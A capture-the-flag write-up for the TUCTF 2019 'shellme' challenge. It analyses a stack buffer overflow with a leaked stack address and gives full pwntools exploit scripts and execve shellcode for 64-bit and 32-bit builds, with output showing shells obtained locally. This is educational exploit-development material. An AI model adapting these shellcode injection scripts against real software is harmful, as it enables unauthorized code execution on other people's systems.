### Binary Exploitation

### Source: TUCTF_19

### Overview: It's a binary that is vulnerable to buffer overflow which will lead to shellcode injection

### Basic File Checks

Working with x86 then x64

### 64Bits Binary

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/shellme]
└─$ file shellme64 
shellme64: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=83254c97da6347cf9cb96f7fe5fad3a28968a719, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/shellme]
└─$ checksec shellme64 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/shellme/shellme64'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Decompiled code

```

undefined8 main(void)

{
  undefined input [32];
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  setvbuf(stdin,(char *)0x0,2,0x14);
  printf("Hey! I think you dropped this\n%p\n> ",input);
  read(0,input,0x40);
  return 0;
}
```

There's buffer overflow cause we can write extra 32 bytes to overflow the input buffer `0x40 - 32 = 32`

To automate the whole process i'll use pwntool script to get both the offset + send the shellcode 

Here's the script

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Binary filename
exe = './shellme64'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

#gdb.attach(io)


# Get leaked address
print(io.recvuntil('Hey! I think you dropped this'))
leak = io.recv()
addr = leak.strip(' ')
stack_addr = int(addr.strip('>'), 16)
print("Stack address at: " +hex(stack_addr))

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    shellcode,
    padding,
    stack_addr
])

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```

Damn!! To get the right shellcode took a whole hell of my time 😂

Here's the result

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/shellme]
└─$ python2 shellme64.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './shellme64': pid 27086
Hey! I think you dropped this
Stack address at: 0x7ffdce137de0
[*] Switching to interactive mode
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ ls -al
total 52
drwxr-xr-x  2 mark mark  4096 Feb  5 14:03 .
drwxr-xr-x 20 mark mark  4096 Feb  5 13:56 ..
-rwxr-xr-x  1 mark mark 15688 Feb  5 13:56 shellme32
-rw-r--r--  1 mark mark   551 Feb  5 13:44 shellme32.py
-rwxr-xr-x  1 mark mark 16880 Feb  5 12:37 shellme64
-rw-r--r--  1 mark mark  1945 Feb  5 14:03 shellme64.py
$ 
```

Now back on x86 

Its still the same binary just compiled as x86

Here's the solve script also note that pwntool can be used to get the offset 😉

```
from pwn import *

io = process('./shellme32')

print(io.recvuntil('Shellcode... Can you say shellcode?'))
leak = io.recv()
addr = leak.strip(' ')
stack_addr = int(addr.strip('>'), 16)
print("Stack address at: " +hex(stack_addr))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
padding = "A"*(40-len(shellcode))
payload = shellcode + padding + p64(stack_addr)

io.sendline(payload)

io.interactive()
```

Running it also gives shell

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/shellme]
└─$ python2 shellme32.py
[+] Starting local process './shellme32': pid 28442
Shellcode... Can you say shellcode?
Stack address at: 0xfff45a14
[*] Switching to interactive mode
$ ls
shellme32  shellme32.py  shellme64  shellme64.py
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ whoami
mark
$ 
```

And we're done

<br> <br>
[Back To Home](../../index.md)
